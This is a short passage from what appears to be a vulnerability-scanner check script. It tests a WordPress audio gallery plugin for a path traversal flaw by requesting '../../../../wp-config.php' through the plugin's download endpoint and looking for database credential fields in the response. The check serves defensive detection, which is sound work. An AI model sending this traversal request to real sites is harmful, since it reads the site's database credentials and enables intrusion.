...
url = dir + "/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?" + "file_path=../../../../wp-config.php&file_size=10";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "DB_NAME", extra_check: make_list( "DB_USER",
	 "DB_PASSWORD" ) )){
